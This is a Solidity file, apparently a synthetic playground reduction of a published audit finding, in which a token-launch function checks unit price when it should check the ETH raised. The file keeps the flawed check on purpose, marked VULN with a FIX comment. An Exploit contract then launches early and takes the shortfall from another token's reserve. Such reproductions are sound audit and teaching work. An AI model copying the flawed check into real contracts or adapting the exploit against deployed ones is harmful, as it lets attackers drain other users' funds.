// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Groupcoin — enableUniswapV3Launch keys off unit price, not ETH raised
    (Pashov, finding 41349).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    The report's test buys 8,200,000 tokens while liquidity needs about 8,357,142.
    This reduction keeps that ratio: unit price crosses the threshold after 820 tokens,
    but the launch still pulls ETH for 835. The missing 15 ETH is taken from the other
    token's reserve. Vulnerable line preserved verbatim below (@> VULN). */

contract Token {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount && allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    receive() external payable {}
}

contract GroupcoinFactory {
    uint256 public constant THRESHOLD_PRICE = 820;
    uint256 public constant TOKENS_FOR_LIQUIDITY = 835;
    Token public eth;
    Pool public pool;
    mapping(uint256 => uint256) public sold;
    mapping(uint256 => uint256) public raised;
    uint256 public otherRaised;
    bool public launched;

    constructor(Token eth_, Pool pool_) {
        eth = eth_;
        pool = pool_;
    }

    function creditOther(uint256 amount) external {
        otherRaised += amount;
    }

    function getUnitPrice(uint256 tokenId) public view returns (uint256) {
        return sold[tokenId];
    }

    function buy(uint256 tokenId, uint256 amount) external {
        require(!launched, "closed");
        eth.transferFrom(msg.sender, address(this), amount * 1 ether);
        sold[tokenId] += amount;
        raised[tokenId] += amount * 1 ether;
    }

    function enableUniswapV3Launch(uint256 tokenId) external {
        uint256 unitPrice = getUnitPrice(tokenId);
        require(unitPrice >= THRESHOLD_PRICE, "NotAtThreshold"); // @> VULN: unit price reaches the threshold before token1Amount of ETH has been raised
        // FIX: require(sold[tokenId] >= TOKENS_FOR_LIQUIDITY, "not enough sold");
        uint256 need = TOKENS_FOR_LIQUIDITY * 1 ether;
        uint256 have = raised[tokenId];
        uint256 shortfall = need - have;
        otherRaised -= shortfall;
        raised[tokenId] = 0;
        eth.transfer(address(pool), need);
        launched = true;
    }
}

contract Exploit {
    Token public eth; // nonce 1
    Pool public pool; // nonce 2
    GroupcoinFactory public factory; // nonce 3
    uint256 public profit;
    uint256 public otherLeft;

    constructor() {
        eth = new Token("ETH");
        pool = new Pool();
        factory = new GroupcoinFactory(eth, pool);
    }

    function run() external {
        eth.mint(address(factory), 20 ether);
        factory.creditOther(20 ether);
        eth.mint(address(this), 820 ether);
        eth.approve(address(factory), 820 ether);
        factory.buy(1, 820);
        factory.enableUniswapV3Launch(1);
        profit = eth.balanceOf(address(pool));
        otherLeft = factory.otherRaised();
        require(factory.launched(), "launch did not commit");
        require(profit == 835 ether, "pool was not funded for 835");
        require(otherLeft == 5 ether, "other reserve was not raided");
    }
}
